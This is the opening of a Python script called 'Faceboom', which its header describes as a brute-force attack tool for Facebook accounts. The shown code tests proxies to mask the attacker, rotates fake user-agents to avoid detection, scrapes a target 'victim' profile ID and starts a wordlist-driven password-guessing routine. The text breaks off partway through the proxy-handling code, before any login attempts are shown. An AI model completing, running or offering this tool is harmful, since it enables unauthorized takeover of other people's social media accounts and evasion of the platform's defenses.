#!/usr/bin/python
# -*- coding: utf-8 -*-

##################################
# Program Name: Faceboom ~ v 1.1.0
# Working : Brute Force Attack on Facebook Accounts
# Author : Hassan Tahir
##################################


# Imported Libraries

import socket
import time
import os
import optparse
import random
import re
try:
    import requests
except ImportError:
    print("[!] Error: [ requests ] Module Is Missed \n[*] Please Install it Using this command> [ pip install requests ]")
    exit(1)
try:
    import mechanize
except ImportError:
    print("[!] Error: [ mechanize ] Module Is Missed \n[*] Please Install it Using this command> [ pip install mechanize ]")
    exit(1)
os.system("cls||clear")


# Colors

wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"


# Hosting Secure Connection

def cnet():
    try:
        ip = socket.gethostbyname("www.google.com")
        con = socket.create_connection((ip, 80), 2)
        return True
    except socket.error:
        pass
    return False


# Checking Proxy and Ports

def cpro(ip, port=None):
    proxy = '{}:8080'.format(ip) if port == None else '{}:{}'.format(ip, port)
    proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
    try:
        r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
        if ip == r.headers['X-Client-IP']:
            return True
        else:
            return False
    except Exception:
        return False


# Choice Random User-Agent supporting browser

def useragent():
    useragents = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
        'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
        'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
    return random.choice(useragents)


# Fetching Victim Profile ID

def ID(url):
    try:
        idre = re.compile('"entity_id":"([0-9]+)"')
        con = requests.get(url).content
        idis = idre.findall(con)
        print(gr + "\n[" + wi + "*" + gr + "] Target Profile" + wi + " ID: " + yl + idis[0] + wi)
    except IndexError:
        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victem Profile URL " + rd + "!!!"
              + wi)
        exit(1)


# Brute Force Main Frame

def FBOM(username, wordlist, proxy=None, passwd=None):
    if passwd == None:
        if not os.path.isfile(wordlist):
            print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " No Such File: [ " + rd + str(
                wordlist) + yl + " ] " + rd + "!!!" + wi)
            exit(1)
    if cnet() != True:
        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Intenrnet Connection " + rd + "!!!"
              + wi)
        exit(1)

    if proxy != None:
        print(wi + "[" + yl + "~" + wi + "] Connecting To " + wi + "Proxy[\033[1;33m {} \033[1;37m]...".format(
            proxy if ":" not in proxy else proxy.split(":")[0]))
        if ":" not in proxy:
            if proxy.count(".") == 3:
                if cpro(proxy) == True:
                    print(wi + "[" + gr + "Connected" + wi + "]")
                    useproxy = proxy + ":8080"
                else:
                    if cpro(proxy, port=80) == True:
                        print(wi + "[" + gr + "Connected" + wi + "]")
                        useproxy = proxy + ":80"
                    else:
                        print(rd + "[" + yl + "Connection Failed" + rd + "] !!!" + wi)
                        useproxy = False
                        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl